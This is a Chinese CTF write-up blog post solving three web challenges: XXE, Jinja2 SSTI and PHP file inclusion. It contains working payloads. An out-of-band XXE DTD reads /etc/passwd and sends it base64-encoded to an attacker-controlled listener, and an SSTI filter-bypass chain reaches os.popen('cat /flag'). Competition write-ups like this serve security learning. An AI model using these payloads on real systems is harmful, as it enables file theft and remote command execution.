<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>ctf-wp-saining | greetdawn&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="环境地址61.147.171.107:10081 61.147.171.107:10082 61.147.171.107:10083    10081 xml注入访问源代码分析，感觉应该的是个xml外部实体注入  先构造payload试一哈： &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [     &lt;!ENTITY">
<meta property="og:type" content="article">
<meta property="og:title" content="ctf-wp-saining">
<meta property="og:url" content="http://www.greetdawn.top/2022/02/15/ctf-wp-saining/index.html">
<meta property="og:site_name" content="greetdawn&#39;s Blog">
<meta property="og:description" content="环境地址61.147.171.107:10081 61.147.171.107:10082 61.147.171.107:10083    10081 xml注入访问源代码分析，感觉应该的是个xml外部实体注入  先构造payload试一哈： &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [     &lt;!ENTITY">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220635177.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221604181.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221634222.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222612642.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222649524.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215165423675.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215172249858.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215529181.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215549758.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215164654261.png">
<meta property="article:published_time" content="2022-02-15T08:34:16.000Z">
<meta property="article:modified_time" content="2022-02-15T14:34:41.898Z">
<meta property="article:author" content="丨greetdawn丨">
<meta property="article:tag" content="面试题">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
</head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">greetdawn's Blog</div>
      
        <div id="subtitle">The God love people</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">greetdawn&#39;s Blog</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="www.greetdawn.top">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-ctf-wp-saining" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/02/15/ctf-wp-saining/" class="article-date">
  <time datetime="2022-02-15T08:34:16.000Z" itemprop="datePublished">2022-02-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">安全竞赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      ctf-wp-saining
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h1><pre class="language-none"><code class="language-none">61.147.171.107:10081
61.147.171.107:10082
61.147.171.107:10083</code></pre>



<h1 id="10081-xml注入"><a href="#10081-xml注入" class="headerlink" title="10081 xml注入"></a>10081 xml注入</h1><p>访问源代码分析，感觉应该的是个xml外部实体注入</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png"></p>
<p>先构造payload试一哈：</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd">
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<p>确实存在，但是有过滤</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220635177.png" alt="image-20220215220635177"></p>
<p>尝试使用参数型实体方式注入：</p>
<p><code>vps</code>构造<code> test.dtd</code></p>
<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>

<p>开启端口监听：<code>nc -lvvp 8888</code></p>
<p>攻击payload:</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE convert [
	&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;139.196.234.164:8899&#x2F;test.dtd&quot;&gt;
	%remote;%int;%send;
]&gt;</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221604181.png" alt="image-20220215221604181"></p>
<p>成功返回加密字符串，解密后获取</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221634222.png" alt="image-20220215221634222"></p>
<p>修改<code>test.dtd</code>获取<code>test.php</code>源码</p>
<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;test.php&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>

<p>发包获取到源码如下：</p>
<pre class="language-none"><code class="language-none">&lt;?php
error_reporting(0);
function showAttrs($attrs) &#123;
    $r &#x3D; [&quot;&quot;];
    foreach ($attrs as $k &#x3D;&gt; $v) &#123;
        array_push($r, $k . &quot;&#x3D;\&quot;&quot; . $v-&gt;textContent . &quot;\&quot;&quot;);
    &#125;
    return implode(&quot; &quot;, $r);
&#125;

function showNode($n, $pre) &#123;
    if ($n-&gt;hasChildNodes()) &#123;
        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&gt;\n&quot;;
        foreach ($n-&gt;childNodes as $c) &#123;
            show($c, $pre . &quot; &quot;);
        &#125;
        echo $pre . &quot;&lt;&#x2F;&quot; . $n-&gt;nodeName . &quot;&gt;\n&quot;;
    &#125; else &#123;
        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&#x2F;&gt;\n&quot;;
    &#125;
&#125;

function show($n, $pre) &#123;
    switch ($n-&gt;nodeType) &#123;
        case XML_ELEMENT_NODE:
            showNode($n, $pre);
            break;

        case XML_TEXT_NODE:
        case XML_CDATA_SECTION_NODE:
        case XML_ENTITY_REF_NODE:
            echo $pre . $n-&gt;textContent . &quot;\n&quot;;
            break;
        
        case XML_COMMENT_NODE:
            echo $pre . &quot;&lt;!--&quot; . $n-&gt;textContent . &quot;--&gt;\n&quot;;
            break;

        case XML_DOCUMENT_NODE:
            foreach ($n-&gt;childNodes as $c) &#123;
                show($c, $pre);
            &#125;
            break;

        default:
        	echo &quot;Nope&quot;;
            break;
    &#125;
&#125;

if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) &#123;
    $d &#x3D; new DOMDocument();
    $data &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);
    if(preg_match(&#39;&#x2F;file|rot13&#x2F;i&#39;, $data))
    &#123;
        die(&#39;illegal!&#39;);
    &#125;
    $d-&gt;loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS |LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT);

    if ($d-&gt;validate()) &#123;
        show($d, &quot;&quot;);
    &#125; else &#123;
        echo &quot;è¿å¥½åä¸æ¯ä¸ªè§èçè¯­å¥å¦&quot;;
    &#125;

&#125; else &#123;
    echo (&quot;è¯·æ±æ¹å¼æè¯¯&quot;);
&#125; </code></pre>

<p>看了一下源码没啥东西</p>
<p>应该不用源码审计，猜测flag可能存在路径下，修改test.dtd包含一下看看</p>
<pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222612642.png" alt="image-20220215222612642"></p>
<p>确实有值，解密后成功拿到flag</p>
<pre class="language-none"><code class="language-none">ZmxhZ3tYUE9aVGQ2NkZhQU1zVXNUcng3QzJ2cURCVm1nRXFiYn0K</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222649524.png" alt="image-20220215222649524"></p>
<h2 id="flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb"><a href="#flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb" class="headerlink" title="flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}"></a>flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}</h2><h1 id="10082-ssti模板注入"><a href="#10082-ssti模板注入" class="headerlink" title="10082 ssti模板注入"></a>10082 ssti模板注入</h1><p>请求获取源码，分析源码，获得变量入口点，首先传参变量是name, 构造<code>/?name=&#123;&#123;4*4&#125;&#125;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215165423675.png" alt="image-20220215165423675"></p>
<p>呦西 ，确实有ssti！</p>
<p>不过存在过滤，几乎把能过滤的东西都过滤了，过滤的死死滴</p>
<pre class="language-python" data-language="python"><code class="language-python">blackwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token string">'add'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'redirect'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'get_flashed_messages'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'form'</span><span class="token punctuation">,</span> <span class="token string">'cookies'</span><span class="token punctuation">,</span> <span class="token string">'headers'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">]</span></code></pre>

<p>那就绕吧，怎么绕呢？</p>
<p>这里可以利用的点就是使用jinja2自身的过滤器进行bypass</p>
<pre class="language-none"><code class="language-none">&#123;% set org &#x3D; (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215172249858.png" alt="image-20220215172249858"></p>
<p>编写获取对应字符串搜索脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment"># -*- coding:utf-8 -*-</span>
<span class="token comment"># author:greetdawn</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://61.147.171.107:10082/?name="</span>
payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;% set sstr = ((app.__doc__|string|list).pop(&#123;num&#125;)|string) %&#125;&#125;&#123;&#123;&#123;&#123;sstr&#125;&#125;&#125;&#125;"</span> 

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token comment"># print(r.text)</span>
	<span class="token keyword">if</span> <span class="token string">'/'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] paylaod: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">break</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"search &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>依次获取更多字符</p>
<pre class="language-jinja2" data-language="jinja2"><code class="language-jinja2">&#123;% set xhx &#x3D; ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125; # _
&#123;% set space &#x3D; ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格
&#123;% set left &#x3D; ((app.__doc__|string|list).pop(171)|string) %&#125; &#123;&#123;left&#125;&#125; # (
&#123;% set right &#x3D; ((app.__doc__|string|list).pop(182)|string) %&#125; &#123;&#123;right&#125;&#125; # )
&#123;% set yin &#x3D; ((app.__doc__|string|list).pop(177)|string) %&#125; # 单引号 &#39;
&#123;% set point &#x3D; ((app.__doc__|string|list).pop(26)|string) %&#125; &#123;&#123;point&#125;&#125; # .

&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;    # builtins
&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;&#123;&#123;imp&#125;&#125; # import
&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;&#123;&#123;pon&#125;&#125; # popen
&#123;% set os &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;&#123;&#123;os&#125;&#125;    # os
&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;    # cat
&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;    # flag
&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;    # eval
&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125; &#123;&#123;red&#125;&#125; # read
&#123;% set bul &#x3D; xhx*2~but~xhx*2 %&#125;    # __builtins__

&#123;% set zero &#x3D; (self|int) %&#125;    # 0, 也可以使用lenght过滤器获取数字
&#123;% set one &#x3D; (zero**zero)|int %&#125;    # 1
&#123;% set two &#x3D; (zero-one-one)|abs %&#125;    # 2
&#123;% set four &#x3D; (two*two)|int %&#125;    # 4
&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;    # 5
&#123;% set three &#x3D; five-one-one %&#125;    # 3
&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;    # 9
&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;    # 7
&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;    # 字符 c
&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;    # 百分号 %
&#123;% set bfhc &#x3D; bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 &#x2F;</code></pre>

<p>根据以上获取字符串进行拼接获取<code>payload:``__import__(’os‘).popen(‘cat /flag’).read()</code></p>
<pre class="language-jinja2" data-language="jinja2"><code class="language-jinja2">http:&#x2F;&#x2F;61.147.171.107:10082&#x2F;?name&#x3D;&#123;% set zero &#x3D; (self|int) %&#125;
&#123;% set one &#x3D; (zero**zero)|int %&#125;
&#123;% set two &#x3D; (zero-one-one)|abs %&#125;
&#123;% set four &#x3D; (two*two)|int %&#125;
&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;
&#123;% set three &#x3D; five-one-one %&#125;
&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;
&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;
&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;
&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;
&#123;% set bfhc &#x3D; bfh~c %&#125;
&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;
&#123;% set space &#x3D; ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;
&#123;% set yin &#x3D; ((app.__doc__|string|list).pop(177)|string) %&#125;
&#123;% set xhx &#x3D; ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;
&#123;% set left &#x3D; ((app.__doc__|string|list).pop(171)|string) %&#125;
&#123;% set right &#x3D; ((app.__doc__|string|list).pop(182)|string) %&#125;
&#123;% set point &#x3D; ((app.__doc__|string|list).pop(26)|string) %&#125;
&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;
&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;
&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;
&#123;% set exo &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;
&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;
&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;
&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;
&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125;
&#123;% set bul &#x3D; xhx*2~but~xhx*2 %&#125; 
&#123;% set pld &#x3D; xhx*2~imp~xhx*2~left~yin~exo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;
&#123;&#123;pld&#125;&#125;</code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215529181.png" alt="image-20220215215529181"></p>
<p>带入万能payload构造eval执行命令</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> whoami<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span> 
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> v<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> 
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215549758.png" alt="image-20220215215549758"></p>
<h2 id="flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS"><a href="#flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS" class="headerlink" title="flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}"></a>flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}</h2><h1 id="10083-文件包含"><a href="#10083-文件包含" class="headerlink" title="10083 文件包含"></a>10083 文件包含</h1><p>请求看源码，典型的文件包含，传入变量<code>file1</code>和<code>file2</code></p>
<p><code>payload：</code></p>
<pre class="language-php" data-language="php"><code class="language-php">file1<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>
file2<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>hello ctf</code></pre>

<p>利用data协议传入原始文件流，利用php://filter协议包含flag.php文件源码</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215164654261.png" alt="image-20220215164654261">成功获取base64值解密得flag</p>
<pre class="language-php" data-language="php"><code class="language-php"> PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9
 
 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"WRONG WAY!"</span><span class="token punctuation">;</span>
<span class="token comment">// $flag = flag&#123;1nlude_and_g0T_1T!&#125;</span></span></code></pre>

<h2 id="flag-flag-1nlude-and-g0T-1T"><a href="#flag-flag-1nlude-and-g0T-1T" class="headerlink" title="flag: flag{1nlude_and_g0T_1T!}"></a><code>flag: flag&#123;1nlude_and_g0T_1T!&#125;</code></h2>
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2022/02/15/ctf-wp-saining/" data-id="ckzqi7ijs0001ioum73eoezfo" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="tag">面试题</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Log4j2基于JDBCAPPENDER配置文件任意文件执行(CVE-2021-44832)</div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 丨greetdawn丨<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>